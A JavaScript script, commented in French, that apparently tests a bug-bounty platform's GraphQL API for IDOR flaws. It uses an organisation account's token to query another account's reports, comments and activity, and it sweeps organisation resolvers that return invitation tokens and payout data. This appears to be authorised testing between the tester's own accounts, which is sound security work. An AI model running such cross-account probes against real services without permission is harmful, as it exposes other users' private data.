// CONTEXTE ORGANISATION : (1) decouverte de l organisation, (2) matrice IDOR inter-comptes,
// (3) sweep des 22 resolvers orgId/organizationId
import fs from "fs";
const EP = "https://bugsecure-api.senintel.sn/graphql";
const T_ORG = fs.readFileSync("/tmp/opencode/orgtoken.txt", "utf8").trim();
const MY_REPORT = "dca04201-559b-4088-bdc3-e1666ea42461";
const MY_USER = "e3aa51e2-2c87-4b64-a3cb-6d5eb857f40c";
const MY_PROGRAM = "7cf52a09-38ca-48ec-a9a5-44c5d517718a";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function gql(tok, q, v) {
  const r = await fetch(EP, { method: "POST", headers: { "Content-Type": "application/json", Authorization: "Bearer " + tok }, body: JSON.stringify({ query: q, variables: v || {} }) });
  const t = await r.text();
  let j = null; try { j = JSON.parse(t); } catch {}
  return j;
}
const show = (l, j) => {
  const e = j?.errors ? "ERR: " + j.errors.map((x) => x.message).join(" | ") : JSON.stringify(j?.data);
  console.log("  " + l.padEnd(46) + e.replace(/\s+/g, " ").slice(0, 150));
  return j;
};
const Q = (name, fields) => `query ${name}{ ${fields} }`;

console.log("=== 1) mon organisation (compte COMPANY_ADMIN) ===");
const orgs = await show("myOrganizations", await gql(T_ORG, Q("MyOrgs", `myOrganizations { id name slug description kycStatus viewerRole viewerActions members { id userId role joinedAt user { id username email } } createdAt }`), {}));
const ORG = orgs?.data?.myOrganizations?.[0]?.id || null;
console.log("  -> orgId =", ORG, "| nb orgs =", orgs?.data?.myOrganizations?.length);

console.log("\n=== 2) matrice IDOR : le compte ORG peut-il lire les ressources du compte PERSONNEL ? ===");
const idor = [
  ["report(id) du rapport d'un autre", `query($id:ID!){ report(id:$id){ id title reporterId status } }`, { id: MY_REPORT }],
  ["reportComments du rapport d'un autre", `query($reportId:ID!){ reportComments(reportId:$reportId){ id content authorId } }`, { reportId: MY_REPORT }],
  ["reportAdjudication d'un autre", `query($reportId:ID!){ reportAdjudication(reportId:$reportId){ id outcome } }`, { reportId: MY_REPORT }],
  ["reportTransitions d'un autre", `query($reportId:ID!){ reportTransitions(reportId:$reportId){ id fromStatus toStatus } }`, { reportId: MY_REPORT }],
  ["researcherActivity d'un autre", `query($userId:ID!){ researcherActivity(userId:$userId){ date submissions validated } }`, { userId: MY_USER }],
  ["getReport (MCP-like) d'un autre", `query($reportId:ID!){ report(id:$reportId){ id title } }`, { reportId: MY_REPORT }],
  ["getPrograms (surface globale)", `query{ programs { id title slug } }`, {}],
  ["getReports (surface globale)", `query{ reports { id title } }`, {}],
  ["myCertificates (certificats de paiement)", `query{ myCertificates { id reference status amount } }`, {}],
  ["search global", `query{ search(query:"ssrf"){ id type title } }`, {}],
];
for (const [l, q, v] of idor) { show(l, await gql(T_ORG, q, v)); await sleep(350); }

if (ORG) {
  console.log("\n=== 3) sweep des resolvers org (contexte MEMBRE d une organisation) ===");
  const orgOps = [
    ["organizationStanding", `query($orgId:ID!){ organizationStanding(orgId:$orgId){ totalIssued currentlyOverdue submissionsSuspended } }`, { orgId: ORG }],
    ["payoutSummary", `query($orgId:ID!){ payoutSummary(orgId:$orgId, months:6){ month amount currency } }`, { orgId: ORG }],
    ["organizationCertificates", `query($orgId:ID!){ organizationCertificates(orgId:$orgId, take:5){ id reference status } }`, { orgId: ORG }],
    ["reportTrends", `query($orgId:ID!){ reportTrends(orgId:$orgId, months:6){ month count } }`, { orgId: ORG }],
    ["severityDistribution", `query($orgId:ID!){ severityDistribution(orgId:$orgId){ severity count } }`, { orgId: ORG }],
    ["getOrganizationInvitations", `query($organizationId:ID!){ getOrganizationInvitations(organizationId:$organizationId){ id email status token } }`, { organizationId: ORG }],
    ["myOrganizationInvitations", `query{ myOrganizationInvitations{ id organizationId organizationName role token expiresAt } }`, {}],
    ["myInvitedPrograms", `query{ myInvitedPrograms{ id name slug } }`, {}],
    ["hasOrganizationAcceptedTerms", `query($organizationId:ID!){ hasOrganizationAcceptedTerms(organizationId:$organizationId) }`, { organizationId: ORG }],
    ["getOrganizationInterventionUsage", `query($organizationId:ID!){ getOrganizationInterventionUsage(organizationId:$organizationId, month:"2026-10"){ count } }`, { organizationId: ORG }],
    ["getOverdueCertificates", `query($organizationId:ID!){ getOverdueCertificates(organizationId:$organizationId){ id } }`, { organizationId: ORG }],
    ["getCriticalReviewQueue", `query($organizationId:ID!){ getCriticalReviewQueue(organizationId:$organizationId){ id } }`, { organizationId: ORG }],
  ];
  for (const [l, q, v] of orgOps) { show(l, await gql(T_ORG, q, v)); await sleep(350); }
  fs.writeFileSync("/tmp/opencode/orgid.txt", ORG);
  console.log("\n  orgId ecrit : /tmp/opencode/orgid.txt");
}
